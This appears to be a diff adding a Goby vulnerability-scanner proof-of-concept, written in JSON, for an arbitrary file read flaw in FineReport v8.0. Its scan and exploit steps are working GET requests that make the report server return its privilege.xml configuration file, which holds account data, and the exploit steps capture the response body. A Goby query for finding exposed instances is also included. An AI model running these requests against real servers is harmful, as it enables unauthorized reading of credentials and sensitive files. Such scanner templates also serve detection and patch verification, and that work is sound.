@@ -1,0 +1,150 @@
+{
+      "Name": "FineReport v8.0 Arbitrary file read ",
+      "Level": "2",
+      "Tags": [
+            "Disclosure of Sensitive Information"
+      ],
+      "GobyQuery": "app=\"fanruansem-FineReport\"",
+      "Description": "Finereport is an enterprise web report tool written in pure Java, which integrates the functions of data display (report) and data entry (form).\n\n\n\nThere is an arbitrary file reading vulnerability in finereport v8.0, which can be used by attackers to read arbitrary files on the website",
+      "Product": "FineReport v8.0",
+      "Homepage": "https://www.fanruan.com/",
+      "Author": "PeiQi",
+      "Impact": "<p>There is an arbitrary file reading vulnerability in finereport v8.0, which can be used by attackers to read arbitrary files.<br></p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+	  "HasExp": true,
+      "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "CDATA",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "CDATA",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "CDATA",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": ["output|lastbody"]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "CDATA",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": ["output|lastbody"]
+            }
+      ],
+      "PostTime": "2021-04-04 23:03:48",
+      "GobyVersion": "1.8.255"
+}
